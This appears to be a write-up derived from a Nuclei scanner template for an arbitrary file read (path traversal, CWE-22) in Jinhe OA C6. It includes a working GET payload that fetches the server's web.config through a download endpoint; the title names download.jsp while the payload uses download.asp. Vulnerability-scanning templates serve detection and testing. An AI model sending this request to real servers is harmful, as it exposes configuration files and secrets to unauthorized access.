# Nuclei Template: Jinhe OA C6 download.jsp - Arbitary File Read
**Template ID:** jinhe-oa-c6-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`jinhe-oa-c6-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file read vulnerability in Jinhe OA C6 download.jsp file, through which an attacker can obtain sensitive information in the server

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
```

